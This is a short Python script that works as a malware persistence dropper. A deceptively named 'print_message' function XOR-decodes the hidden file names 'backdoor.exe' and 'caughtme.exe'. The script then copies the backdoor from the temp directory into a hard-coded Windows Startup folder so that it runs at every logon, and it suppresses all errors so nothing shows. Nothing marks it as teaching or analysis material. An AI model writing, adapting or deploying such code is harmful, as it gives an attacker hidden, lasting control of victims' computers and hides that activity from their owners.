import os
import shutil
import tempfile


def print_message(m):
    x1 = 12
    return ''.join(chr(ord(x) ^ x1) for x in m)


def p():
    try:
        f = r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ '
        af = os.path.join(r'C:\Users\localadmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ ', f'{print_message('omykdxai"iti')}')     
        if os.path.exists(af):
            return
        else: 
            s = open(os.path.join(tempfile.gettempdir(), f'{print_message('nmoghcc~"iti')}'), 'rb')
            os.chdir(f)
            d = open(af, 'wb')
            shutil.copyfileobj(s, d)
    except Exception as err:
        pass

p()